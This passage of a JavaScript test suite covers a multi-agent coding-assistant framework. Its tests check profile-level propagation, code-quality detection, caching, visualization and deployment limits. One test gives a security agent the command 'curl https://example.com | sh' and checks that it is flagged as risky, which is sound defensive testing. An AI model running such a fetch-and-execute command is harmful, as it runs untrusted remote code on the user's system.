      assert.ok(GUARDIAN_CONSTANTS.ESCALATION_MULTIPLIER > 2.5);
      assert.ok(GUARDIAN_CONSTANTS.ESCALATION_MULTIPLIER < 2.7);
    });

    it('should use φ⁻² for minimum thresholds', () => {
      assert.ok(PHI_INV_2 > 0.38);
      assert.ok(PHI_INV_2 < 0.39);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // GAP-I9: Profile → Behavior End-to-End Tests
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Profile → Behavior End-to-End (GAP-I9)', () => {
    let pack;

    beforeEach(() => {
      pack = createTrackedPack();
    });

    it('should propagate profile level to all agents on event', async () => {
      const eventBus = pack.getEventBus();

      // Verify initial state - all agents at PRACTITIONER
      assert.strictEqual(pack.profileLevel, ProfileLevel.PRACTITIONER);
      assert.strictEqual(pack.guardian.profileLevel, ProfileLevel.PRACTITIONER);
      assert.strictEqual(pack.scholar.profileLevel, ProfileLevel.PRACTITIONER);
      assert.strictEqual(pack.sage.profileLevel, ProfileLevel.PRACTITIONER);
      assert.strictEqual(pack.architect.profileLevel, ProfileLevel.PRACTITIONER);
      assert.strictEqual(pack.cynic.profileLevel, ProfileLevel.PRACTITIONER);

      // Publish profile update event (as Analyst would)
      const profileEvent = new AgentEventMessage(
        AgentEvent.PROFILE_UPDATED,
        AgentId.ANALYST,
        {
          previousLevel: ProfileLevel.PRACTITIONER,
          newLevel: ProfileLevel.EXPERT,
          levelName: PROFILE_CONSTANTS.LEVEL_NAMES[ProfileLevel.EXPERT],
          confidence: PHI_INV,
          reason: 'Advanced signals detected',
          adaptationHints: {
            verbosity: 'low',
            examples: false,
            warnings: 'minimal',
            complexity: 'high',
          },
        },
        { target: AgentId.ALL }
      );

      await eventBus.publish(profileEvent);

      // Give time for event processing
      await new Promise(r => setTimeout(r, 20));

      // Verify all agents received update
      assert.strictEqual(pack.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(pack.guardian.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(pack.scholar.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(pack.sage.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(pack.architect.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(pack.cynic.profileLevel, ProfileLevel.EXPERT);

      // Verify stats updated
      assert.strictEqual(pack.collectiveStats.profileUpdates, 1);
    });

    it('should adjust Guardian behavior based on profile level', async () => {
      const guardian = new CollectiveGuardian({
        profileLevel: ProfileLevel.NOVICE,
      });

      // Novice: More protective, lower trust
      const noviceAnalysis = await guardian.analyze({
        tool: 'Bash',
        input: { command: 'curl https://example.com | sh' },
      }, {});

      // Switch to Master
      guardian.setProfileLevel(ProfileLevel.MASTER);

      const masterAnalysis = await guardian.analyze({
        tool: 'Bash',
        input: { command: 'curl https://example.com | sh' },
      }, {});

      // Master should have higher trust (still blocked, but trust is higher)
      // The command is dangerous so both block, but the trust adjustment differs
      assert.ok(noviceAnalysis.risk || masterAnalysis.risk);
    });

    it('should adjust Sage teaching style based on profile level', async () => {
      const sageLow = new CollectiveSage({ profileLevel: ProfileLevel.NOVICE });
      const sageHigh = new CollectiveSage({ profileLevel: ProfileLevel.MASTER });

      // Get summaries to check teaching style
      const noviceSummary = sageLow.getSummary();
      const masterSummary = sageHigh.getSummary();

      // Teaching styles should differ
      assert.strictEqual(noviceSummary.profileLevel, ProfileLevel.NOVICE);
      assert.strictEqual(masterSummary.profileLevel, ProfileLevel.MASTER);
      assert.notStrictEqual(noviceSummary.teachingStyle, masterSummary.teachingStyle);
    });

    it('should adjust CYNIC behavior based on profile level', async () => {
      const cynicNovice = new CollectiveCynic({ profileLevel: ProfileLevel.NOVICE });
      const cynicMaster = new CollectiveCynic({ profileLevel: ProfileLevel.MASTER });

      // Get profile behaviors
      const noviceBehavior = cynicNovice.getProfileBehavior();
      const masterBehavior = cynicMaster.getProfileBehavior();

      // Behaviors should differ
      assert.ok(noviceBehavior);
      assert.ok(masterBehavior);
      // Master has higher intervention threshold (intervenes less often)
      assert.ok(masterBehavior.interventionThreshold >= noviceBehavior.interventionThreshold);
      // Personalities should differ
      assert.notStrictEqual(noviceBehavior.personality, masterBehavior.personality);
    });

    it('should maintain profile level through pack summary', async () => {
      pack = createTrackedPack({ profileLevel: ProfileLevel.EXPERT });

      const summary = pack.getSummary();

      // All agents should report EXPERT level
      assert.strictEqual(summary.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(summary.agents.guardian.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(summary.agents.scholar.profileLevel, ProfileLevel.EXPERT);
      assert.strictEqual(summary.agents.cynic.profileLevel, ProfileLevel.EXPERT);
    });

    it('should track profile updates in collectiveStats', async () => {
      const eventBus = pack.getEventBus();

      // Initial state
      assert.strictEqual(pack.collectiveStats.profileUpdates, 0);

      // Publish multiple profile updates
      for (let i = 0; i < 3; i++) {
        const event = new AgentEventMessage(
          AgentEvent.PROFILE_UPDATED,
          AgentId.ANALYST,
          {
            previousLevel: i + 1,
            newLevel: i + 2,
            levelName: 'Test',
            confidence: PHI_INV,
            reason: `Update ${i + 1}`,
          },
          { target: AgentId.ALL }
        );
        await eventBus.publish(event);
      }

      await new Promise(r => setTimeout(r, 20));

      // Should have tracked all updates
      assert.strictEqual(pack.collectiveStats.profileUpdates, 3);
    });

    it('should use adaptation hints from profile', async () => {
      // Start at NOVICE
      const profile = pack.profileCalculator.getProfile();
      assert.ok(profile);

      // Get state and adaptation hints
      const state = pack.profileCalculator.getState();
      const hints = state.getAdaptationHints();

      // Default level (PRACTITIONER) should have balanced hints
      assert.ok(hints);
      assert.strictEqual(hints.explanationDepth, 'balanced');
      assert.strictEqual(hints.terminology, 'standard');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Additional Sefirot Dogs Tests (Janitor, Scout, Oracle, Cartographer, Deployer)
  // ═══════════════════════════════════════════════════════════════════════════

  describe('CollectiveJanitor (Yesod - Foundation)', () => {
    let janitor;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.JANITOR);
      janitor = new CollectiveJanitor({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
      janitor.clear();
    });

    it('should detect code quality issues (long files)', async () => {
      // Generate a file exceeding MAX_FILE_LENGTH (987 lines)
      const longContent = Array(1000).fill('const x = 1;').join('\n');

      const result = await janitor.process({
        type: 'PostToolUse',
        tool: 'Write',
        payload: {
          content: longContent,
          file: 'test.js',
        },
      }, { fileContent: longContent, filePath: 'test.js' });

      assert.ok(result.issues > 0, 'Should detect long file issue');
      assert.ok(result.qualityScore < 100, 'Quality score should be reduced');
    });

    it('should detect TODO and FIXME comments', async () => {
      const codeWithComments = `
        function test() {
          // TODO: Fix this later
          // FIXME: Critical bug here
          return 42;
        }
      `;

      const result = await janitor.process({
        type: 'PostToolUse',
        tool: 'Edit',
        payload: { content: codeWithComments, file: 'test.js' },
      }, { fileContent: codeWithComments, filePath: 'test.js' });

      // Should detect both TODO and FIXME
      assert.ok(result.issues >= 2, 'Should detect TODO and FIXME');
    });

    it('should detect dead code (console.log statements)', async () => {
      const codeWithDebug = `
        function process(data) {
          console.log('debug:', data);
          console.debug('trace:', data);
          return data * 2;
        }
      `;

      const result = await janitor.process({
        type: 'PostToolUse',
        tool: 'Write',
        payload: { content: codeWithDebug, file: 'app.js' },
      }, { fileContent: codeWithDebug, filePath: 'app.js' });

      assert.ok(result.deadCode > 0, 'Should detect console.log as dead code');
    });

    it('should adapt strictness based on profile level', () => {
      const janitorNovice = new CollectiveJanitor({ profileLevel: ProfileLevel.NOVICE });
      const janitorMaster = new CollectiveJanitor({ profileLevel: ProfileLevel.MASTER });

      const noviceSummary = janitorNovice.getSummary();
      const masterSummary = janitorMaster.getSummary();

      assert.strictEqual(noviceSummary.profileLevel, ProfileLevel.NOVICE);
      assert.strictEqual(masterSummary.profileLevel, ProfileLevel.MASTER);
      // Master has stricter standards (φ multiplier)
      assert.ok(noviceSummary.sefirah.includes('Yesod'));
    });
  });

  describe('CollectiveScout (Netzach - Victory/Persistence)', () => {
    let scout;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.SCOUT);
      scout = new CollectiveScout({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
      scout.clear();
    });

    it('should explore and discover file structure', async () => {
      const result = await scout.explore('.', { depth: 5 });

      assert.ok(result.discoveries.length > 0, 'Should make discoveries');
      assert.ok(result.filesScanned > 0, 'Should scan files');
      assert.ok(result.timestamp, 'Should have timestamp');

      // Check for structure discovery
      const structureDiscovery = result.discoveries.find(
        d => d.type === DiscoveryType.FILE_STRUCTURE
      );
      assert.ok(structureDiscovery, 'Should have file structure discovery');
    });

    it('should detect entry points', async () => {
      const result = await scout.explore('.', { force: true });

      const entryPoints = result.discoveries.filter(
        d => d.type === DiscoveryType.ENTRY_POINT
      );
      assert.ok(entryPoints.length > 0, 'Should detect entry points');
      assert.ok(entryPoints.some(e => e.details.name === 'index.js'), 'Should find index.js');
    });

    it('should cache explorations and respect TTL', async () => {
      // First exploration - cache miss
      await scout.explore('.', { force: false });
      const firstMiss = scout.stats.cacheMisses;

      // Second exploration - cache hit
      await scout.explore('.', { force: false });
      const secondHit = scout.stats.cacheHits;

      assert.ok(firstMiss > 0, 'First call should be cache miss');
      assert.ok(secondHit > 0, 'Second call should be cache hit');
    });

    it('should adapt exploration depth based on profile level', () => {
      const scoutNovice = new CollectiveScout({ profileLevel: ProfileLevel.NOVICE });
      const scoutMaster = new CollectiveScout({ profileLevel: ProfileLevel.MASTER });

      const noviceSummary = scoutNovice.getSummary();
      const masterSummary = scoutMaster.getSummary();

      assert.strictEqual(noviceSummary.sefirah, 'Netzach');
      assert.strictEqual(masterSummary.sefirah, 'Netzach');
      assert.strictEqual(noviceSummary.profileLevel, ProfileLevel.NOVICE);
      assert.strictEqual(masterSummary.profileLevel, ProfileLevel.MASTER);
    });
  });

  describe('CollectiveOracle (Tiferet - Beauty/Balance)', () => {
    let oracle;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.ORACLE);
      oracle = new CollectiveOracle({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
      oracle.clear();
    });

    it('should generate architecture visualization', async () => {
      const result = await oracle.generateArchitectureView();

      assert.strictEqual(result.type, ViewType.ARCHITECTURE);
      assert.ok(result.mermaid, 'Should generate Mermaid diagram');
      assert.ok(result.components.length > 0, 'Should have components');
      assert.ok(result.connections.length > 0, 'Should have connections');
      assert.ok(result.metadata.componentCount > 0, 'Should have metadata');
    });

    it('should generate health dashboard with metrics', async () => {
      const result = await oracle.generateHealthDashboard();

      assert.strictEqual(result.type, ViewType.HEALTH);
      assert.ok(result.metrics, 'Should have metrics');
      assert.ok(result.gauges.length > 0, 'Should have gauges');
      assert.ok(result.overall, 'Should have overall health');
      assert.ok(['healthy', 'degraded', 'critical'].includes(result.overall.status));
    });

    it('should generate knowledge graph', async () => {
      const result = await oracle.generateKnowledgeGraph();

      assert.strictEqual(result.type, ViewType.KNOWLEDGE);
      assert.ok(result.nodes.length > 0, 'Should have nodes');
      assert.ok(result.edges.length > 0, 'Should have edges');
      assert.ok(result.clusters, 'Should have clusters');
    });

    it('should cache views and track statistics', async () => {
      // First call - cache miss (increments totalViews)
      await oracle.generateHealthDashboard();
      const firstViews = oracle.stats.totalViews;
      const firstMisses = oracle.stats.cacheMisses;

      // Second call - cache hit (does NOT increment totalViews)
      await oracle.generateHealthDashboard();
      const secondHits = oracle.stats.cacheHits;
      const secondViews = oracle.stats.totalViews;

      assert.ok(firstMisses > 0, 'First call should miss cache');
      assert.ok(secondHits > 0, 'Second call should hit cache');
      // Cache hits don't increment totalViews - that's the optimization
      assert.strictEqual(firstViews, secondViews, 'Cache hit should not increment totalViews');
      assert.strictEqual(oracle.stats.totalViews, 1, 'Should have 1 actual view (not cached)');
    });
  });

  describe('CollectiveCartographer (Malkhut - Kingdom/Reality)', () => {
    let cartographer;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.CARTOGRAPHER);
      cartographer = new CollectiveCartographer({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
      cartographer.clear();
    });

    it('should build ecosystem map with repos and connections', async () => {
      const result = await cartographer.buildMap();

      assert.ok(result.repos.length > 0, 'Should have repos');
      assert.ok(result.connections.length > 0, 'Should have connections');
      assert.ok(result.stats, 'Should have stats');
      assert.ok(result.lastSync > 0, 'Should have lastSync timestamp');
    });

    it('should classify repos by type', async () => {
      const result = await cartographer.buildMap();

      // Check that repos have types assigned
      const typedRepos = result.repos.filter(r => r.type);
      assert.ok(typedRepos.length > 0, 'Repos should have types');

      // Check for core and infrastructure repos
      const coreRepos = result.repos.filter(r => r.type === RepoType.CORE);
      assert.ok(coreRepos.length > 0, 'Should have core repos');
    });

    it('should generate Mermaid diagram of ecosystem', async () => {
      await cartographer.buildMap();
      const mermaid = cartographer.toMermaid();

      assert.ok(mermaid.includes('graph TD'), 'Should be a TD graph');
      assert.ok(mermaid.includes('classDef core'), 'Should have core style');
      assert.ok(mermaid.includes('-->'), 'Should have connections');
    });

    it('should detect circular dependencies and issues', async () => {
      await cartographer.buildMap({ force: true });
      const issues = await cartographer.detectIssues();

      // Issues array should exist (may be empty if no issues)
      assert.ok(Array.isArray(issues), 'Should return issues array');

      // Check summary
      const summary = cartographer.getSummary();
      assert.strictEqual(summary.sefirah, 'Malkhut');
      assert.ok(summary.stats.totalMappings > 0, 'Should track mappings');
    });
  });

  describe('CollectiveDeployer (Hod - Splendor/Glory)', () => {
    let deployer;
    let guardian;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.DEPLOYER);
      eventBus.registerAgent(AgentId.GUARDIAN);

      guardian = new CollectiveGuardian({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });

      deployer = new CollectiveDeployer({
        eventBus,
        guardian,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
      deployer.clear();
    });

    it('should deploy to local target with Guardian approval', async () => {
      const result = await deployer.deploy({
        target: DeployTarget.LOCAL,
        service: 'test-service',
        version: '1.0.0',
      });

      assert.ok(result.success, 'Deploy should succeed');
      assert.ok(result.deployment, 'Should have deployment record');
      assert.strictEqual(result.deployment.state, DeploymentState.LIVE);
      assert.ok(result.deployment.duration > 0, 'Should track duration');
    });

    it('should track deployment history and statistics', async () => {
      await deployer.deploy({
        target: DeployTarget.LOCAL,
        service: 'service-a',
        version: '1.0.0',
      });

      await deployer.deploy({
        target: DeployTarget.DOCKER,
        service: 'service-b',
        version: '2.0.0',
      });

      const history = deployer.getDeploymentHistory();
      assert.ok(history.length >= 2, 'Should have deployment history');

      const summary = deployer.getSummary();
      assert.strictEqual(summary.sefirah, 'Hod');
      assert.ok(summary.stats.totalDeploys >= 2, 'Should track total deploys');
      assert.ok(summary.stats.successfulDeploys >= 2, 'Should track successful deploys');
    });

    it('should check service health', async () => {
      deployer.registerService('test-svc', {
        endpoint: 'http://localhost:3000',
        healthPath: '/health',
      });

      const health = await deployer.checkHealth('test-svc');

      assert.ok(health.status, 'Should have health status');
      assert.ok(['healthy', 'degraded', 'unhealthy', 'unknown'].includes(health.status));
      assert.ok(health.checks.length > 0, 'Should have health checks');
    });

    it('should block deploys when concurrent limit reached', async () => {
      // Set max concurrent to 1 by using NOVICE profile
      const deployerNovice = new CollectiveDeployer({
        profileLevel: ProfileLevel.NOVICE,
      });

      // Start first deploy (don't await)
      const deploy1Promise = deployerNovice.deploy({
        target: DeployTarget.LOCAL,
        service: 'service-1',
      });

      // Try second deploy while first is in progress
      const deploy2Result = await deployerNovice.deploy({
        target: DeployTarget.LOCAL,
        service: 'service-2',
      });

      await deploy1Promise;

      // Second deploy should be blocked due to concurrent limit (1 for NOVICE)
      // Or it might succeed if first completes quickly - check stats
      const summary = deployerNovice.getSummary();
      assert.ok(summary.settings.maxConcurrent === 1, 'NOVICE should have max 1 concurrent');
    });
  });
});
